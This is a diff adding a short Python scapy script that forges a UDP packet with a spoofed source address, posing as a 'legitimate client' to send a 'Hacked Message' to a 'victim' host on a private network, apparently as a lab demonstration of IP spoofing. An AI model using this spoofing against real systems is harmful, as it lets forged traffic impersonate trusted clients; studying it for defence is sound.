@@ -1,0 +1,12 @@
+from scapy.all import *
+
+victim_ip = "192.168.1.10"       # Victim machine
+victim_port = 9999
+spoofed_ip = "192.168.1.20"      # Pretend to be the legitimate client
+
+packet = IP(src=spoofed_ip, dst=victim_ip) / \
+         UDP(sport=12345, dport=victim_port) / \
+         Raw(load="Hacked Message")
+
+send(packet, verbose=1)
+print("Spoofed UDP packet sent!")
